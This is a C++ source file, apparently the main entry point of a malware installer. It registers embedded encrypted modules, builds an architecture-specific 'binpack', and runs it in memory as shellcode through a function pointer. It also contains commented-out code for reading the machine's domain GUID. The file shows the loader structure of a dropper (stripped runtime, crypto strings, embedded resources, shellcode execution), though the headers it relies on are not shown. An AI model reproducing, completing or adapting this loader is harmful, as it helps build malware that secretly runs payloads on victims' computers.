// main.cpp : Defines the entry point for the application.


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")


#include <windows.h>

// for dbg GetComputerObjectName() test
/*
#define SECURITY_WIN32
#include <security.h>
#pragma comment (lib, "secur32.lib")
*/

#include "..\inc\mem.h"
#include "..\inc\dbg.h"
#include "..\inc\CryptoStrings.h"
#include "..\inc\EmbeddedResources.h"
#include "..\Shellcode\shellcode.h"


#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, "..\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\amd64\\ntdll.lib")
	#define TARGET_ARCH ARCH_TYPE_X64
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, "..\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\i386\\ntdll.lib")
	#define TARGET_ARCH ARCH_TYPE_X32
#else
	#error Unknown target CPU, no system libs can be found
#endif

// binary resources to be registered, all items in serialized structure to be passed
// ending items contains { 0 } strucutre to stop enum just after it
#include "..\inc\binpack.h"



#include "inst.h"

// dbg to show GUID for compname
// NB: looks like guid is assigned only when machine joins a domain
/*
VOID _objname()
{
	LPWSTR wszName;	// buffer to hold guid string
	ULONG ulSize = 256;

	wszName = (LPWSTR)my_alloc(1024);

	GetComputerObjectName(NameUniqueId, wszName, &ulSize);
	DbgPrint("compname guid=[%ws]", wszName);

	my_free(wszName);

}*/

/*
LONG CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
	DbgPrint("handler entered");

	ExitThread(255);

	return 0;
}
*/

// entrypoint function for installer exe file
void __cdecl main()
{
	// buffer to hold exec chunk
	LPVOID pExecBuffer = NULL;
	DWORD dwExecBufferLen = 0;

	ShellcodeEntryPoint shEntry;	// ptr to entrypoint for shellcode at pExecBuffer
	LPVOID pContextPtr = NULL;	// ptr at pExecBuffer to SHELLCODE_CONTEXT structure

	//HANDLE pHandler = NULL;

	DbgPrint("entered, registering modules");

	// enum and register all embedded modules
	erRegisterModules(&pbinpack);

	// generate binpack
	DbgPrint("generating binpack for execution");
	if (erGetStarterBinpack(TARGET_ARCH, &pExecBuffer, &dwExecBufferLen, &pContextPtr, (LPVOID *)&shEntry)) {

		//if (!(pHandler = AddVectoredExceptionHandler(0, &VectoredHandler))) { DbgPrint("ERR: failed to add vectored handler"); }

		// do exec
		DbgPrint("executing from %p passing param %p, pExecBuffer=%p dwExecBufferLen=%u", shEntry, pContextPtr, pExecBuffer, dwExecBufferLen);
		shEntry(pContextPtr);
		DbgPrint("all done");

	} else { DbgPrint("ERR: failed to generate exec buffer"); }

	Sleep(5000);
	
	// is this needed?
	ExitProcess(0);
}






